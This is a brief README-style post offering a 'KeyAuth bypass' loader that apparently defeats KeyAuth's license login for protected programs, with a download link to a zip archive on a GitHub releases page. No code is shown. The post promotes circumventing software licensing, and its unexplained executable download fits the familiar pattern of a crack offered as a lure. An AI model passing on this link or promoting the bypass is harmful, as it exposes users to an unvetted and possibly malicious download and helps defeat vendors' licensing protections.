# KeyAuth Bypass for All Programs

It seems that KeyAuth's security measures are inadequate. I recommend discontinuing the use of nlohmann and implementing an integrity check instead.

Please be aware that the repository may be taken down by mak, but I've created a website that should remain accessible. You can find it at: [https://github.com/rednightmare6mnp/KeyAuth-Bypass-Loader-Appication-Auth/releases/download/aed59joze35/KeyAuth-Bypass-Loader-Appication-Auth.zip). I hastily put this together out of boredom in around 10 minutes. While it's not the most sophisticated method and might not work for downloading files from KeyAuth due to the lack of a valid session ID, it's effective for logging in via KeyAuth. Should this approach be patched, I'll likely identify another exploit and share it here.
